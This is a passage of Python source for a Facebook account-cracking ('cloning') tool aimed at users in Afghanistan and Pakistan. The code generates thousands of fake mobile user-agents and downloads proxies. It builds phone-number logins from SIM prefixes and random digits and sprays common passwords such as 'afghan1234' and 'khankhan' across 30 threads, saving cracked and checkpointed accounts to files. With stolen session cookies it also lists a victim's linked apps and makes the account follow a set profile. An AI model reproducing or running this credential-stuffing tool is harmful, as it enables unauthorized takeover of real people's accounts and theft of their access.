       "Mozilla/5.0 (Linux; Android 11; EPIC PRO_1 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/298.0.0.10.115;]",
       "Mozilla/5.0 (Linux; Android 9; S32 Build/P00610; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/337.0.0.7.102;]",
       "Mozilla/5.0 (Linux; Android 10; itel W4001S Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/249.0.0.10.119;]",
       "Mozilla/5.0 (Linux; Android 9; SM-S367VL Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/222.0.0.15.124;]",] 
prox = []
try:
    prox= requests.get('https://raw.githubusercontent.com/BestProfessionals/Professionals/main/.prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print(' WELCOME TO RANDOM CLONING SYSTEM')
    
prox=open('.prox.txt','r').read().splitlines()
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
        ua=open('.bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n') 
        ua=open('.bbnew.txt','r').read().splitlines()

loop = 0
cp = []
ok = []
twf = []

ugen = []
try:
    prox= requests.get('https://raw.githubusercontent.com/BestProfessionals/Professionals/main/.prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print(' WELCOME TO RANDOM CLONING SYSTEM')
    
prox=open('.prox.txt','r').read().splitlines()
for xd in range(5000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; Infinix '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT','SMART'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
    
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; TECNO '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
  #  awm = ['[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FB_IAB/FB4A;FBAV/371.0.0.24.109;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/324.0.0.8.106;]', '[FB_IAB/FB4A;FBAV/388.0.0.32.105;]', '[FB_IAB/FB4A;FBAV/364.0.0.24.132;]', '[FB_IAB/FB4A;FBAV/386.0.0.35.108;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/318.0.0.16.105;]', '[FB_IAB/FB4A;FBAV/365.0.0.30.112;]', '[FB_IAB/FB4A;FBAV/362.0.0.27.109;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]']
  #  m = random.choice(awm)
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
for xd in range(4000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; Smart HD Pro 2019 '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    awm = ['[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FB_IAB/FB4A;FBAV/371.0.0.24.109;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/324.0.0.8.106;]', '[FB_IAB/FB4A;FBAV/388.0.0.32.105;]', '[FB_IAB/FB4A;FBAV/364.0.0.24.132;]', '[FB_IAB/FB4A;FBAV/386.0.0.35.108;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/318.0.0.16.105;]', '[FB_IAB/FB4A;FBAV/365.0.0.30.112;]', '[FB_IAB/FB4A;FBAV/362.0.0.27.109;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]','[FB_IAB/FB4A;FBAV/397.0.0.23.404;]','[FB_IAB/FB4A;FBAV/396.1.0.28.104;]','[FB_IAB/FB4A;FBAV/309.0.0.47.119;]']
    m = random.choice(awm)
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l} {m}')
    ugen.append(uaku2)
  
  
for xd in range(30000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; QMobile '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT','POWER'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    awm = ['[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FB_IAB/FB4A;FBAV/371.0.0.24.109;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/324.0.0.8.106;]', '[FB_IAB/FB4A;FBAV/388.0.0.32.105;]', '[FB_IAB/FB4A;FBAV/364.0.0.24.132;]', '[FB_IAB/FB4A;FBAV/386.0.0.35.108;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/318.0.0.16.105;]', '[FB_IAB/FB4A;FBAV/365.0.0.30.112;]', '[FB_IAB/FB4A;FBAV/362.0.0.27.109;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]']
    m = random.choice(awm)
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l} {m}')
    ugen.append(uaku2)
    
    
for xd in range(1000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; QMobile '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT','POWER'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
  #  awm = ['[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FB_IAB/FB4A;FBAV/371.0.0.24.109;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/324.0.0.8.106;]', '[FB_IAB/FB4A;FBAV/388.0.0.32.105;]', '[FB_IAB/FB4A;FBAV/364.0.0.24.132;]', '[FB_IAB/FB4A;FBAV/386.0.0.35.108;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/318.0.0.16.105;]', '[FB_IAB/FB4A;FBAV/365.0.0.30.112;]', '[FB_IAB/FB4A;FBAV/362.0.0.27.109;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]']
   # m = random.choice(awm)
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)


    
    aa='Mozilla/5.0 (Windows NT 10.0; Win64;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
	
    
    


try:
    prox= requests.get('https://raw.githubusercontent.com/BestProfessionals/Professionals/main/.prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print(' WELCOME TO RANDOM CLONING SYSTEM')
    
prox=open('.prox.txt','r').read().splitlines()

    
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://raw.githubusercontent.com/Ssh-007/UA/main/January2023.txt').text
        ua=open('.bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n') 
        ua=open('.bbnew.txt','r').read().splitlines()

loop = 0
cp = []
ok = []
twf = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"

logo =                                          ("""   


\033[1;90m                   db    Yb        dP  8b   d8 
\033[1;91m                  dPYb    Yb  db  dP   8YbmdP8  \033[1;91m E
\033[1;93m                 dPwwYb    YbdPYbdP    8  "  8   \033[1;93m  N
\033[1;92m                dP    Yb    YP  YP     8     8      \033[1;92m D

\033[1;32m               \033[1;35mCREATED BY\33[0;m   :  \033[1;31mA.W.M\33[0;m\033[1;39m Pro \033[1;35mTeam\33[0;m
\033[1;32m               \033[1;32mAUTHOR       :  \033[1;32mMirwais Danishyar
\033[1;32m               \033[1;36mGITHUB       :  \033[1;33mBestProfessional
\033[1;32m               \033[1;32mSTATUS       :  \033[1;32mPermium
\033[1;32m               \033[1;34mVIRSION      :  \033[1;31m1.5.0 [ E.N.D ]
\33[37;44m\t         The best thing ! to do is to Start it..\33[0;m 
\033[1;32m--------------------------------------------------------------
""")

clear()
os.system("xdg-open https://www.facebook.com/subhanullah.niazay")
xxxx = str(len(ugen))

NameX =input('\033[1;97m[+]\033[1;92mYOUR NAME \033[1;91m: \033[1;96m')
#---------------------[LOOP MENU]---------------------#
loop = 0
cp = []
ok = []
twf = []
#---------------------[APPLICATION CHECKER]---------------------#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print('\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \033[1;93mSorry no Active  Apk')
    else:
        print('\r[??] \033[1;92m 😍 Your Active Apps 😍 \033[1;91m: \033[1;96m')
        for i in range(len(game)):
            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
            #created by hbf team(owners) mirwais & Hamii
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print('\r\033[1;92m[+]\033[1;91m Sorry No Expired Apk')
    else:
        print('\r[🎮] \033[1;96m 😞 Expired Apps 😞 \033[1;91m: \033[1;92m')
        for i in range(len(game)):
            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('\033[1;32m--------------------------------------------------------------') 
def follow(ses,coki):
    ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
    get = r.find('a', string='Follow').get('href')
    ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

#---------------------[MAIN MENU]---------------------#
def main():
    clear()
    os.getuid
    os.system("clear");print(logo)
    clear()
    print (' \t           \033[1;37m       [ \033[1;31mMENU \033[1;37m]')
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\033[1;97m[+] \033[1;92mNAME \033[1;91m: \033[1;96m{NameX}")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\033[1;97m[01] \033[1;92mSTART CLONING")
    print(f"\033[1;97m[02] \033[1;92mJOIN TO BEST TECHNICAL TELEGRAM")
    print(f"\033[1;97m[03] \033[1;92mJOIN TO AWM PROGRAMING TELEGRAM")
    print(f"\033[1;97m[00] \033[1;92mEXIT ")
    print('\033[1;32m--------------------------------------------------------------') 
    mirwais = input("\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SELECT \033[1;37m: \033[1;36m")
    if mirwais in ["1","01"]:
        passx()
    elif mirwais in ["2","02"]:
        os.system("xdg-open https://t.me/best_technicals")
        main()
    elif mirwais in ["3","03"]:
        os.system("xdg-open https://t.me/AWM_PROGRAMING")
        main()
    elif mirwais in ["0","00"]:
       exit()
    else:
        print('\033[1;31mINCORECT OPTION!\3[1;31m')
        main()

def passx():
    os.system("clear")
    print(logo)
    print('\033[1;32m--------------------------------------------------------------') 
    print('              \x1b[97m\033[37;40m        [ SELECT METHOD ]\033[0;m ')
    print('\033[1;32m--------------------------------------------------------------') 
    print("\033[1;97m[01] \033[1;93mPASS 7 DIGITS   (RANDOM PASS)\033[1;95m    {V-SLOW-ON}")
    print("\033[1;97m[02] \033[1;93mPASS 7 AND     & AFGHAN1234 PASS \033[1;95m{FAST-ON}")
    print("\033[1;97m[03] \033[1;93mPASS 7 DIGITS  & KHANKHAN\033[1;95m        {FAST-ON}")
    print("\033[1;97m[04] \033[1;93mPASS 7 DIGITS  & AFGHAN       \033[1;95m   {SLOW-ON}")
    print("\033[1;97m[05] \033[1;93mPASS 7 DIGITS  & AFGHANISTAN   \033[1;95m  {SLOW-ON}")
    print("\033[1;97m[06] \033[1;93mPASS 7 DIGITS  & 100200 PASS \033[1;95m    {FAST-ON}")
    print("\033[1;97m[07] \033[1;93mPASS 7 DIGITS  & KABUL1234 PASS \033[1;95m {FAST-ON}")
    print("\033[1;97m[08] \033[1;93mPASS 7 DIGITS  & KABUL123 PASS \033[1;95m  {FAST-ON}")
    print("\033[1;97m[09] \033[1;93mPASS 7 DIGITS  & AFGHAN123 PASS \033[1;95m {FAST-ON}")
    print("\033[1;97m[10] \033[1;93mPASS 7 DIGITS  & 1122334455 PASS \033[1;95m{FAST-ON}")
    print("\033[1;97m[11] \033[1;93mPASS 7 DIGITS  & 1234512345 PASS \033[1;95m{FAST-ON}")
    print("\033[1;97m[12] \033[1;93mPASS 7 DIGITS  & 786786 PASS \033[1;95m    {FAST-ON}")
    print("\033[1;97m[13] \033[1;93mPASS 7 DIGITS  & 500600 PASS \033[1;95m    {FAST-ON}")
    print("\033[1;97m[14] \033[1;93mPASS 7 DIGITS  & KABUL1234 PASS \033[1;95m {FAST-ON}")
    print("\033[1;97m[15] \033[1;96mPASS 6 DIGITS  & KABUL1234 PASS \033[1;95m {FAST-ON}")
    print("\033[1;97m[16] \033[1;96mPASS 6 DIGITS  & KABUL123 PASS \033[1;95m  {FAST-ON}")
    print("\033[1;97m[17] \033[1;96mPASS 6 DIGITS  & AFGHAN1234 PASS \033[1;95m{FAST-ON}")
    print("\033[1;97m[18] \033[1;96mPASS 6 DIGITS  & AFGHAN123 PASS \033[1;95m {FAST-ON}")
    print("\033[1;97m[19] \033[1;96mPASS 6 DIGITS  & AFGHANISTAN PASS\033[1;95m{FAST-ON}")
    print("\033[1;97m[20] \033[1;96mPASS 6 DIGITS  & AFGHAN PASS \033[1;95m    {FAST-ON}")
    print("\033[1;97m[21] \033[1;94mPASS 7 DIGITS  & KHANKHAN PASS \033[1;95m  {FAST-ON}")
    print("\033[1;97m[22] \033[1;94mPASS 7 DIGITS  & KHAN1234 PASS \033[1;95m  {FAST-ON}")
    print("\033[1;97m[23] \033[1;94mPASS 7 DIGITS  & KHAN123 PASS \033[1;95m   {FAST-ON}")
    print("\033[1;97m[24] \033[1;94mPASS 7 DIGITS  & PAKISTAN PASS \033[1;95m  {FAST-ON}")
    print("\033[1;97m[25] \033[1;94mPASS 7 DIGITS  & KHAN KHAN PASS \033[1;95m {FAST-ON}")
    print("\033[1;97m[26] \033[1;94mPASS 7 DIGITS  & KHAN1122 PASS \033[1;95m  {FAST-ON}")
    print("\033[1;97m[27] \033[1;94mPASS 7 DIGITS  & KHAN786 PASS \033[1;95m   {FAST-ON}")
    print("\033[1;97m[28] \033[1;96mPUBLIC CLONING        \033[1;91m{OFF}")
    print("\033[1;97m[29] \033[1;94mFOLLOWER CLONING      \033[1;91m{OFF}")
    print("\033[1;97m[30] \033[1;95mFILE CLONING          \033[1;91m{OFF}")
    print("\033[1;97m[31] \033[1;92mCREAT FILE BEST       \033[1;91m{OFF}")
    print('\033[1;32m--------------------------------------------------------------') 
    mirwais = input("\033[1;37m[\033[1;32m!\033[1;37m]\033[1;37m SELECT METHOD \033[1;37m: \033[1;36m")
    if mirwais in ["1","01"]:
        awm1()
    elif mirwais in ["2","02"]:
        awm2()
    elif mirwais in ["3","03"]:
        awm3()
    elif mirwais in ["4","04"]:
       awm4()
    elif mirwais in ["5","05"]:
       awm5()
    elif mirwais in ["6","06"]:
       awm6()
    elif mirwais in ["7","07"]:
       awm7()
    elif mirwais in ["8","08"]:
       awm8()       
    elif mirwais in ["9","09"]:
       awm9()     
    elif mirwais in ["10","10"]:
       awm10()       
    elif mirwais in ["11","11"]:
       awm11()       
    elif mirwais in ["12","12"]:
       awm12()       
    elif mirwais in ["13","13"]:
       awm13()       
    elif mirwais in ["14","14"]:
       awm14()       
    elif mirwais in ["15","15"]:
       awm15()       
    elif mirwais in ["16","16"]:
       awm16()      
    elif mirwais in ["17","17"]:
       awm17()       
    elif mirwais in ["18","18"]:
       awm18()       
    elif mirwais in ["19","19"]:
       awm19()      
    elif mirwais in ["20","20"]:
       awm20()
    elif mirwais in ["21","21"]:
       awm21()       
    elif mirwais in ["22","22"]:
       awm22()       
    elif mirwais in ["23","23"]:
       awm23()
    elif mirwais in ["24","24"]:
       awm24()
    elif mirwais in ["25","25"]:
       awm25()
    elif mirwais in ["25","25"]:
       awm26()
    elif mirwais in ["25","25"]:
       awm27()


      
    else:
        print('\033[1;31mINCORECT OPTION!\3[1;31m')
        passx()

def awm1():
    os.system("clear")
    print(logo)
    clear()        
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;93mMTN SIM CODES  \033[1;91m             : \033[1;96m9377, 9376')
    print(f'\033[1;97m[!] \033[1;93mROSHAN SIM CODES \033[1;91m           : \033[1;96m9379, 9372')
    print(f'\033[1;97m[!] \033[1;93mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m9370, 9378')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'afghan12345', 'afghan1234']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/B-T-OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/B-T-CP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()


def awm2():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;93mMTN SIM CODES  \033[1;91m             : \033[1;96m9377, 9376')
    print(f'\033[1;97m[!] \033[1;93mROSHAN SIM CODES \033[1;91m           : \033[1;96m9379, 9372')
    print(f'\033[1;97m[!] \033[1;93mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m9370, 9378')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'afghan1234']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def awm3():
    os.system("clear")
    print(logo)
    clear()
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;92mPAKISTAN SIM CODES  \033[1;91m       : \033[1;96m92304, 92308 , 92333')
    print(f'\033[1;97m[!] \033[1;92mPAKISTAN SIM CODES \033[1;91m: \033[1;96m0301, 0304')
#    print(f'\033[1;97m[!] \033[1;92mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m9370, 9378')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'khankhan']
